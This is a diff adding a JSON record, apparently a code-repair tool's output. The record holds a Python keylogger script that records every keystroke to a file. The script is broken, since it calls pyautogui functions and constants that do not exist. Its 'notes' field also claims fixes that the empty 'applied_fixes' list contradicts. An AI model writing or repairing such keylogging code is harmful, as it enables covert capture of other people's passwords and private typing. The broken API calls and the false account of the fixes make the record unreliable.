@@ -1,0 +1,6 @@
+{
+  "output": "import pyautogui\n\nwith open('keylogs.txt', 'w') as f:\n    while True:\n        key = pyautogui.keyStroke()\n        if key.isprintable():\n            f.write(key)\n        elif key == pyautogui.KEY_RETURN:\n            f.write('[ENTER]')\n        elif key == pyautogui.KEY_BACKSPACE:\n            f.write('[BACKSPACE]')\n\n        print(key)",
+  "notes": "Fixed indentation, added print statements for debugging",
+  "applied_fixes": [],
+  "iterations": 1
+}
